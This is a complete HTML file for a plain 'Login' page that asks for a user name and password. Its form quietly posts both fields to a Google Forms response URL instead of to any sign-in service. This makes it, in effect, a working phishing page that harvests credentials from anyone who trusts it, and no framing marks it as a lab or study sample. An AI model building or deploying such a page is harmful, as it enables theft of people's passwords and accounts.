<!Doctype html>
<html>
<header>
    <title>
        Login
    </title>
    <link href="../static/dist/css/login.css" rel="stylesheet">
</header>

<body>
<div class="box">
    <h1>
        Login
    </h1>
    <form
            action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSfKRJWkAJiGdlOJ2I_d5KE0hthytt5kfoxi-2pn_P-ifD3R2w/formResponse"
            method="post">
        <div class="input-box">
            <input class="input" name="user" required type="text">
            <label class="lable">User Name</label>
        </div>
        <div class="input-box">
            <input class="input" name="pass" required type="password">
            <label class="lable">Enter Your Password</label>
        </div>
        <div class="input-box">
            <input class="btn-submit" name="submit" type="submit">

        </div>
    </form>
</div>
</body>

</html>
